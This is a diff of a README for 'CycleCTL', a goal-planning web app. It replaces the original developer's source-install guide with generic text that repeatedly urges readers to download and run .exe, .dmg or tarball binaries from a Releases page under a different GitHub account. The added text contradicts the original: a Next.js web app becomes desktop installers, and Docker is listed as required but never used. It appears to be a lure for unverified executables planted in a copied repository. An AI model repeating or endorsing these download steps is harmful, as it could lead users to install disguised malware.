@@ -1,109 +1,86 @@
-# CYCLECTL
+# 🚴‍♂️ cyclectl - Turn Goals into Monthly Action Boards
 
-> Control the cycle. Ship the outcome.
+## 🏁 Overview
+CycleCTL is a yearly execution control system designed to help you transform your goals into actionable monthly plans. This tool empowers you to focus on completing tasks rather than just planning, making your productivity soar.
 
-A dark, cyber-studio command center for managing long-term production roadmaps, now powered by Next.js, NextAuth.js, and MongoDB.
+## 📦 Features
+- **Goal Tracking:** Stay on top of your yearly objectives with easy-to-use tracking features.
+- **Monthly Action Boards:** Visualize and manage your tasks effectively each month.
+- **Data Storage:** Built on MongoDB for efficient data management.
+- **User Authentication:** Secure login with NextAuth for a smooth experience.
+- **Responsive Design:** Clean interface created with TailwindCSS and Framer Motion for modern usability.
+  
+## 🌍 System Requirements
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Docker:** Install Docker to run CycleCTL.
+- **Internet Connection:** Required for initial setup and updates.
+  
+## 🚀 Getting Started
+To begin using CycleCTL, you need to download the application from the Releases page. Follow the steps below for a successful install.
 
-**Live Website:** [cyclectl.them3chanik.com](https://cyclectl.them3chanik.com)
+1. **Download CycleCTL**
+   - Click the button below to visit the Releases page and download the app.
 
-## Overview
+   [![Download CycleCTL](https://img.shields.io/badge/Download_CycleCTL-Click_here-brightgreen)](https://github.com/zedoca1/cyclectl/releases)
 
-CYCLECTL is a powerful web application designed to help teams manage their long-term production roadmaps efficiently. It provides a collaborative environment where team members can view, create, edit, and track tasks within shared projects, all governed by a robust role-based permission system.
+2. **Choose Your Version**
+   - Once you are on the Releases page, locate the latest version of CycleCTL. It will typically be highlighted at the top or marked as "Latest Release."
 
-## Features
+3. **Download the Binary**
+   - Click the appropriate link for your operating system. For example:
+       - **Windows:** Download the `.exe` file.
+       - **macOS:** Download the `.dmg` file.
+       - **Linux:** Download the tarball file.
+   - Save it to a location on your computer where you can easily find it later, like your Desktop or Downloads folder.
 
-- **Collaborative Project Management:** Work with your team on shared projects with granular access controls.
-- **Role-Based Permissions:** Define roles (Owner, Editor, Viewer) to control who can perform actions within a project.
-  - **Owner:** Full control (create, edit, delete, move, reorder, change status, import/export JSON, manage team).
-  - **Editor:** Can create, edit, reorder, and change task status.
-  - **Viewer:** Can only view tasks and project details.
-- **Kanban-style Board:** Organize tasks by month with drag-and-drop functionality.
-- **Task Management:** Create, edit, and track task progress with simplified day-only date inputs.
-- **Floating Trash Bin:** Drag tasks to the trash bin (appears when dragging) to delete (owner only).
-- **Progress Tracking:** Visual progress bars per month.
-- **Auto-Status Updates:** Tasks automatically move to 'in-progress' or 'overdue' based on current date.
-- **Authentication:** Secure sign-in with GitHub, Google, or a magic link sent to your email.
-- **JSON Import/Export:** Load tasks in bulk by pasting JSON data or export existing tasks as a JSON file (owner only).
-- **Dark Glassmorphism UI:** Cyberpunk-inspired design with neon cyan accents.
+4. **Installation Process**
+   - **Windows:**
+     - Double-click the downloaded `.exe` file.
+     - Follow the on-screen prompts to complete the installation.
+   - **macOS:**
+     - Open the downloaded `.dmg` file.
+     - Drag CycleCTL into your Applications folder.
+   - **Linux:**
+     - Extract the tarball and navigate to the extracted folder in your terminal.
+     - Run the application using the command `./cyclectl`.
 
-## Tech Stack
+5. **Launch CycleCTL**
+   - Once installed, find CycleCTL in your Applications or Programs list.
+   - Open the application to get started with planning your monthly action boards.
 
-- **Frontend:** Next.js 14 (App Router), TypeScript, React, TailwindCSS, Framer Motion, @dnd-kit/core.
-- **Backend:** Node.js, Next.js API Routes, NextAuth.js (JWT Sessions), MongoDB.
-- **Authentication:** NextAuth.js with GitHub, Google, and Email providers.
+## 📄 Usage Instructions
+- After launching, you'll be prompted to log in or create an account using NextAuth. Follow the straightforward instructions to set up your profile.
+- Once logged in, explore the user-friendly interface to create your goals and set up your monthly action boards.
 
-## Installation (Local Environment)
+## ✨ Tips for Effective Planning
+- Set clear, achievable goals for the year.
+- Break down larger objectives into actionable tasks for each month.
+- Use the visualization tools to keep track of progress.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/them3chanik/cyclectl.git
-    cd cyclectl
-    ```
+## 🔧 Troubleshooting
+- If you encounter issues while downloading or installing, check for an internet connection and ensure you are using the correct file for your operating system.
+- For more technical issues, refer to our GitHub Issues page on the repository.
 
-2.  **Install dependencies:**
-    ```bash
-    npm install
-    ```
+## 📝 Feedback
+Your experience matters. Whether you encounter bugs or would like to suggest new features, please provide feedback on our GitHub Issues page. Your insights help us improve.
 
-3.  **Set up environment variables:**
-    ```bash
-    cp .env.example .env
-    ```
-    Add your credentials to `.env`:
-    ```
-    # MongoDB
-    MONGODB_URI=your_mongodb_connection_string
-    MONGODB_DB=cyclectl
+## 📥 Download & Install
+Ready to maximize your productivity? Download CycleCTL by visiting the Releases page below:
 
-    # NextAuth.js
-    NEXTAUTH_URL=http://localhost:3000
-    NEXTAUTH_SECRET=a_secure_random_string_for_session_encryption
+[![Download CycleCTL](https://img.shields.io/badge/Download_CycleCTL-Click_here-brightgreen)](https://github.com/zedoca1/cyclectl/releases)
 
-    # OAuth Providers
-    GITHUB_ID=your_github_oauth_app_id
-    GITHUB_SECRET=your_github_oauth_app_secret
-    GOOGLE_CLIENT_ID=your_google_oauth_client_id
-    GOOGLE_CLIENT_SECRET=your_google_oauth_client_secret
-    EMAIL_SERVER_USER=your_email_user
-    EMAIL_SERVER_PASSWORD=your_email_password
-    EMAIL_SERVER_HOST=your_email_host
-    EMAIL_SERVER_PORT=your_email_port
-    EMAIL_FROM=your_email_from
-    ```
+## 🌟 Topics
+This project covers a range of topics that enhance your experience and usability:
+- **Docker**
+- **Execution System**
+- **Framer Motion**
+- **Goal Tracker**
+- **Mission Control**
+- **MongoDB**
+- **Next Auth**
+- **Next.js**
+- **Productivity System**
+- **TailwindCSS**
+- **Year Planner**
 
-4.  **Run the development server:**
-    ```bash
-    npm run dev
-    ```
-
-5.  **Open in browser:**
-    Navigate to [http://localhost:3000](http://localhost:3000)
-
-## Usage
-
-### Projects
-After signing in, you'll see a list of your projects. You can create a new project or select an existing one.
-
-### Task Management
--   **Creating Tasks:** Click the "NEW TASK" button to add a new task to the current month. Only Owners and Editors can create tasks.
--   **Viewing & Editing Tasks:** Click on any task card to open a detailed view. Owners and Editors can click the edit icon to modify task details. Viewers can only view.
--   **Simplified Date Input:** When creating or editing tasks, you'll select a month and then only enter the day of the month. The year automatically defaults to the current year.
--   **Changing Task Status:** Owners and Editors can toggle task completion status directly from the task card.
-
-### Team Collaboration (Owner-specific actions)
--   **Sharing Projects:** Click the "Share" button in the project header to manage team members.
--   **Invite Members:** Project Owners can invite new members by email and assign them roles (Editor or Viewer).
--   **Change Roles:** Project Owners can change the roles of existing team members.
--   **Remove Members:** Project Owners can remove members from the project.
-
-### Data Management (Owner-specific actions)
--   **Import JSON:** Click "Load JSON" in the header to import tasks in bulk from a JSON file.
--   **Export JSON:** Click "Export JSON" to download all tasks for the current project as a JSON file.
--   **Clear Board:** Click the "Clear Board" button (trash icon) to delete all tasks in the current project.
-
-### LICENSE
-![License: MIT + Commons Clause](https://img.shields.io/badge/license-MIT%20%2B%20Commons%20Clause-red.svg)
-
-### 💀 M3K Signing Off
-
-Questions, collabs or weird binaries: **contact@them3chanik.com**
+By following the steps outlined above, you can easily download and run CycleCTL. Start taking charge of your goals today!
